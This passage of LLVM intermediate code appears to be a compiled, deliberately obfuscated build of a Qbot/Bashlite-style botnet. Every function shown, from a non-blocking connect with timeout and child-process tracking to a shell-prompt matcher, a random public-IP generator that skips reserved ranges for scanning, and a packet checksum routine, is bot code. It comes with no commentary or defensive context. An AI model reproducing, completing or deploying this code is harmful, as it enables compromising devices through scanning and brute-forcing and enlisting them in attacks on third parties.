  %155 = load i8*, i8** %17, align 8
  store i8 0, i8* %155, align 1
  %156 = load i32, i32* %18, align 4
  store i32 %156, i32* %4, align 4
  br label %157

; <label>:157:                                    ; preds = %154, %137
  %158 = load i32, i32* %4, align 4
  ret i32 %158
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = and i64 %22, 2048
  %24 = xor i64 %22, 2048
  %25 = or i64 %23, %24
  %26 = or i64 %22, 2048
  store i64 %25, i64* %15, align 8
  %27 = load i32, i32* %6, align 4
  %28 = load i64, i64* %15, align 8
  %29 = call i32 (i32, i32, ...) @fcntl(i32 %27, i32 4, i64 %28)
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = load i32, i32* %8, align 4
  %32 = trunc i32 %31 to i16
  %33 = call zeroext i16 @htons(i16 zeroext %32) #10
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  %35 = load i8*, i8** %7, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %37 = call i32 @getHost(i8* %35, %struct.in_addr* %36)
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %129

; <label>:40:                                     ; preds = %4
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %42 = getelementptr inbounds [8 x i8], [8 x i8]* %41, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 8, i32 4, i1 false)
  %43 = load i32, i32* %6, align 4
  %44 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %45 = call i32 @connect(i32 %43, %struct.sockaddr* %44, i32 16)
  store i32 %45, i32* %16, align 4
  %46 = load i32, i32* %16, align 4
  %47 = icmp slt i32 %46, 0
  br i1 %47, label %48, label %113

; <label>:48:                                     ; preds = %40
  %49 = call i32* @__errno_location() #10
  %50 = load i32, i32* %49, align 4
  %51 = icmp eq i32 %50, 115
  br i1 %51, label %52, label %111

; <label>:52:                                     ; preds = %48
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  br label %57

; <label>:57:                                     ; preds = %52
  %58 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #5, !srcloc !4
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  br label %66

; <label>:66:                                     ; preds = %57
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = xor i64 %76, -1
  %78 = xor i64 %70, -1
  %79 = xor i64 1805602149998463089, -1
  %80 = and i64 %77, 1805602149998463089
  %81 = and i64 %76, %79
  %82 = and i64 %78, 1805602149998463089
  %83 = and i64 %70, %79
  %84 = or i64 %80, %81
  %85 = or i64 %82, %83
  %86 = xor i64 %84, %85
  %87 = or i64 %77, %78
  %88 = xor i64 %87, -1
  %89 = or i64 1805602149998463089, %79
  %90 = and i64 %88, %89
  %91 = or i64 %86, %90
  %92 = or i64 %76, %70
  store i64 %91, i64* %75, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sub i32 0, %93
  %95 = sub i32 0, 1
  %96 = add i32 %94, %95
  %97 = sub i32 0, %96
  %98 = add nsw i32 %93, 1
  %99 = call i32 @select(i32 %97, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %100 = icmp sgt i32 %99, 0
  br i1 %100, label %101, label %109

; <label>:101:                                    ; preds = %66
  store i32 4, i32* %13, align 4
  %102 = load i32, i32* %6, align 4
  %103 = bitcast i32* %14 to i8*
  %104 = call i32 @getsockopt(i32 %102, i32 1, i32 4, i8* %103, i32* %13) #5
  %105 = load i32, i32* %14, align 4
  %106 = icmp ne i32 %105, 0
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %101
  store i32 0, i32* %5, align 4
  br label %129

; <label>:108:                                    ; preds = %101
  br label %110

; <label>:109:                                    ; preds = %66
  store i32 0, i32* %5, align 4
  br label %129

; <label>:110:                                    ; preds = %108
  br label %112

; <label>:111:                                    ; preds = %48
  store i32 0, i32* %5, align 4
  br label %129

; <label>:112:                                    ; preds = %110
  br label %113

; <label>:113:                                    ; preds = %112, %40
  %114 = load i32, i32* %6, align 4
  %115 = call i32 (i32, i32, ...) @fcntl(i32 %114, i32 3, i8* null)
  %116 = sext i32 %115 to i64
  store i64 %116, i64* %15, align 8
  %117 = load i64, i64* %15, align 8
  %118 = xor i64 %117, -1
  %119 = xor i64 -2049, -1
  %120 = xor i64 4646925697861548178, -1
  %121 = or i64 %118, %119
  %122 = or i64 4646925697861548178, %120
  %123 = xor i64 %121, -1
  %124 = and i64 %123, %122
  %125 = and i64 %117, -2049
  store i64 %124, i64* %15, align 8
  %126 = load i32, i32* %6, align 4
  %127 = load i64, i64* %15, align 8
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 4, i64 %127)
  store i32 1, i32* %5, align 4
  br label %129

; <label>:129:                                    ; preds = %113, %111, %109, %107, %39
  %130 = load i32, i32* %5, align 4
  ret i32 %130
}

declare i32 @fcntl(i32, i32, ...) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %63

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1440252860231659108
  %13 = add i64 %12, 1
  %14 = sub i64 %13, 1440252860231659108
  %15 = add i64 %11, 1
  store i64 %14, i64* @numpids, align 8
  %16 = load i64, i64* @numpids, align 8
  %17 = sub i64 0, %16
  %18 = sub i64 0, 1
  %19 = add i64 %17, %18
  %20 = sub i64 0, %19
  %21 = add i64 %16, 1
  %22 = mul i64 %20, 4
  %23 = call noalias i8* @malloc(i64 %22) #5
  %24 = bitcast i8* %23 to i32*
  store i32* %24, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %25

; <label>:25:                                     ; preds = %44, %10
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = load i64, i64* @numpids, align 8
  %29 = add i64 %28, 6494793549799882476
  %30 = sub i64 %29, 1
  %31 = sub i64 %30, 6494793549799882476
  %32 = sub i64 %28, 1
  %33 = icmp ult i64 %27, %31
  br i1 %33, label %34, label %50

; <label>:34:                                     ; preds = %25
  %35 = load i32*, i32** @pids, align 8
  %36 = load i32, i32* %4, align 4
  %37 = zext i32 %36 to i64
  %38 = getelementptr inbounds i32, i32* %35, i64 %37
  %39 = load i32, i32* %38, align 4
  %40 = load i32*, i32** %3, align 8
  %41 = load i32, i32* %4, align 4
  %42 = zext i32 %41 to i64
  %43 = getelementptr inbounds i32, i32* %40, i64 %42
  store i32 %39, i32* %43, align 4
  br label %44

; <label>:44:                                     ; preds = %34
  %45 = load i32, i32* %4, align 4
  %46 = sub i32 %45, -602755786
  %47 = add i32 %46, 1
  %48 = add i32 %47, -602755786
  %49 = add i32 %45, 1
  store i32 %48, i32* %4, align 4
  br label %25

; <label>:50:                                     ; preds = %25
  %51 = load i32, i32* %2, align 4
  %52 = load i32*, i32** %3, align 8
  %53 = load i64, i64* @numpids, align 8
  %54 = sub i64 %53, -3076781519954723334
  %55 = sub i64 %54, 1
  %56 = add i64 %55, -3076781519954723334
  %57 = sub i64 %53, 1
  %58 = getelementptr inbounds i32, i32* %52, i64 %56
  store i32 %51, i32* %58, align 4
  %59 = load i32*, i32** @pids, align 8
  %60 = bitcast i32* %59 to i8*
  call void @free(i8* %60) #5
  %61 = load i32*, i32** %3, align 8
  store i32* %61, i32** @pids, align 8
  %62 = load i32, i32* %2, align 4
  store i32 %62, i32* %1, align 4
  br label %63

; <label>:63:                                     ; preds = %50, %8
  %64 = load i32, i32* %1, align 4
  ret i32 %64
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.262, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #9
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %114, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #9
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %121

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %85, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %83

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, -2542805186081408762
  %30 = sub i64 %29, %28
  %31 = add i64 %30, -2542805186081408762
  %32 = sub i64 0, %28
  %33 = getelementptr inbounds i8, i8* %26, i64 %31
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %81, label %37

; <label>:37:                                     ; preds = %22
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, %43
  %45 = add i64 0, %44
  %46 = sub i64 0, %43
  %47 = getelementptr inbounds i8, i8* %41, i64 %45
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = icmp eq i32 %49, 32
  br i1 %50, label %81, label %51

; <label>:51:                                     ; preds = %37
  %52 = load i8*, i8** %3, align 8
  %53 = load i32, i32* %5, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i32, i32* %7, align 4
  %57 = sext i32 %56 to i64
  %58 = sub i64 0, -9020857283847683957
  %59 = sub i64 %58, %57
  %60 = add i64 %59, -9020857283847683957
  %61 = sub i64 0, %57
  %62 = getelementptr inbounds i8, i8* %55, i64 %60
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 13
  br i1 %65, label %81, label %66

; <label>:66:                                     ; preds = %51
  %67 = load i8*, i8** %3, align 8
  %68 = load i32, i32* %5, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i32, i32* %7, align 4
  %72 = sext i32 %71 to i64
  %73 = sub i64 0, 5911073961899097604
  %74 = sub i64 %73, %72
  %75 = add i64 %74, 5911073961899097604
  %76 = sub i64 0, %72
  %77 = getelementptr inbounds i8, i8* %70, i64 %75
  %78 = load i8, i8* %77, align 1
  %79 = sext i8 %78 to i32
  %80 = icmp eq i32 %79, 10
  br label %81

; <label>:81:                                     ; preds = %66, %51, %37, %22
  %82 = phi i1 [ true, %51 ], [ true, %37 ], [ true, %22 ], [ %80, %66 ]
  br label %83

; <label>:83:                                     ; preds = %81, %18
  %84 = phi i1 [ false, %18 ], [ %82, %81 ]
  br i1 %84, label %85, label %91

; <label>:85:                                     ; preds = %83
  %86 = load i32, i32* %7, align 4
  %87 = sub i32 %86, -462120756
  %88 = add i32 %87, 1
  %89 = add i32 %88, -462120756
  %90 = add nsw i32 %86, 1
  store i32 %89, i32* %7, align 4
  br label %18

; <label>:91:                                     ; preds = %83
  %92 = load i8*, i8** %3, align 8
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i32, i32* %7, align 4
  %97 = sext i32 %96 to i64
  %98 = add i64 0, 2210162844766510996
  %99 = sub i64 %98, %97
  %100 = sub i64 %99, 2210162844766510996
  %101 = sub i64 0, %97
  %102 = getelementptr inbounds i8, i8* %95, i64 %100
  %103 = load i8, i8* %102, align 1
  %104 = sext i8 %103 to i32
  %105 = load i8*, i8** %4, align 8
  %106 = load i32, i32* %6, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8, i8* %105, i64 %107
  %109 = load i8, i8* %108, align 1
  %110 = sext i8 %109 to i32
  %111 = icmp eq i32 %104, %110
  br i1 %111, label %112, label %113

; <label>:112:                                    ; preds = %91
  store i32 1, i32* %2, align 4
  br label %122

; <label>:113:                                    ; preds = %91
  br label %114

; <label>:114:                                    ; preds = %113
  %115 = load i32, i32* %6, align 4
  %116 = sub i32 0, %115
  %117 = sub i32 0, 1
  %118 = add i32 %116, %117
  %119 = sub i32 0, %118
  %120 = add nsw i32 %115, 1
  store i32 %119, i32* %6, align 4
  br label %11

; <label>:121:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %122

; <label>:122:                                    ; preds = %121, %112
  %123 = load i32, i32* %2, align 4
  ret i32 %123
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %132, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %130, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 10
  br i1 %21, label %130, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 100
  br i1 %25, label %26, label %34

; <label>:26:                                     ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp sge i32 %28, 64
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp sle i32 %32, 127
  br i1 %33, label %130, label %34

; <label>:34:                                     ; preds = %30, %26, %22
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 127
  br i1 %37, label %130, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 169
  br i1 %41, label %42, label %46

; <label>:42:                                     ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 254
  br i1 %45, label %130, label %46

; <label>:46:                                     ; preds = %42, %38
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 172
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %46
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp sle i32 %52, 16
  br i1 %53, label %54, label %58

; <label>:54:                                     ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp sle i32 %56, 31
  br i1 %57, label %130, label %58

; <label>:58:                                     ; preds = %54, %50, %46
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 192
  br i1 %61, label %62, label %70

; <label>:62:                                     ; preds = %58
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %70

; <label>:66:                                     ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp eq i32 %68, 2
  br i1 %69, label %130, label %70

; <label>:70:                                     ; preds = %66, %62, %58
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 192
  br i1 %73, label %74, label %82

; <label>:74:                                     ; preds = %70
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 88
  br i1 %77, label %78, label %82

; <label>:78:                                     ; preds = %74
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 99
  br i1 %81, label %130, label %82

; <label>:82:                                     ; preds = %78, %74, %70
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 192
  br i1 %85, label %86, label %90

; <label>:86:                                     ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 168
  br i1 %89, label %130, label %90

; <label>:90:                                     ; preds = %86, %82
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp eq i32 %92, 198
  br i1 %93, label %94, label %102

; <label>:94:                                     ; preds = %90
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 18
  br i1 %97, label %130, label %98

; <label>:98:                                     ; preds = %94
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 19
  br i1 %101, label %130, label %102

; <label>:102:                                    ; preds = %98, %90
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 198
  br i1 %105, label %106, label %114

; <label>:106:                                    ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 51
  br i1 %109, label %110, label %114

; <label>:110:                                    ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 100
  br i1 %113, label %130, label %114

; <label>:114:                                    ; preds = %110, %106, %102
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 203
  br i1 %117, label %118, label %126

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 0
  br i1 %121, label %122, label %126

; <label>:122:                                    ; preds = %118
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 113
  br i1 %125, label %130, label %126

; <label>:126:                                    ; preds = %122, %118, %114
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp sge i32 %128, 224
  br label %130

; <label>:130:                                    ; preds = %126, %122, %110, %98, %94, %86, %78, %66, %54, %42, %34, %30, %18, %14
  %131 = phi i1 [ true, %122 ], [ true, %110 ], [ true, %98 ], [ true, %94 ], [ true, %86 ], [ true, %78 ], [ true, %66 ], [ true, %54 ], [ true, %42 ], [ true, %34 ], [ true, %30 ], [ true, %18 ], [ true, %14 ], [ %129, %126 ]
  br i1 %131, label %132, label %145

; <label>:132:                                    ; preds = %130
  %133 = call i32 @rand() #5
  %134 = srem i32 %133, 223
  %135 = trunc i32 %134 to i8
  store i8 %135, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %136 = call i32 @rand() #5
  %137 = srem i32 %136, 255
  %138 = trunc i32 %137 to i8
  store i8 %138, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %139 = call i32 @rand() #5
  %140 = srem i32 %139, 255
  %141 = trunc i32 %140 to i8
  store i8 %141, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %142 = call i32 @rand() #5
  %143 = srem i32 %142, 255
  %144 = trunc i32 %143 to i8
  store i8 %144, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:145:                                    ; preds = %130
  %146 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %146, i8 0, i64 16, i32 16, i1 false)
  %147 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %148 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %149 = zext i8 %148 to i32
  %150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %151 = zext i8 %150 to i32
  %152 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %153 = zext i8 %152 to i32
  %154 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %155 = zext i8 %154 to i32
  %156 = call i32 (i8*, i8*, ...) @szprintf(i8* %147, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.263, i32 0, i32 0), i32 %149, i32 %151, i32 %153, i32 %155)
  %157 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %158 = call i32 @inet_addr(i8* %157) #5
  ret i32 %158
}

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %6, -1
  %8 = xor i32 %5, %7
  %9 = and i32 %8, %5
  %10 = and i32 %5, %6
  store i32 %9, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = call i32 @rand_cmwc()
  %13 = load i32, i32* %2, align 4
  %14 = xor i32 %13, -1
  %15 = and i32 -1, %14
  %16 = xor i32 -1, -1
  %17 = and i32 %13, %16
  %18 = or i32 %15, %17
  %19 = xor i32 %13, -1
  %20 = xor i32 %12, -1
  %21 = xor i32 %18, -1
  %22 = xor i32 1345010812, -1
  %23 = or i32 %20, %21
  %24 = or i32 1345010812, %22
  %25 = xor i32 %23, -1
  %26 = and i32 %25, %24
  %27 = and i32 %12, %18
  %28 = xor i32 %11, -1
  %29 = and i32 %26, %28
  %30 = xor i32 %26, -1
  %31 = and i32 %11, %30
  %32 = or i32 %29, %31
  %33 = xor i32 %11, %26
  ret i32 %32
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %24

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
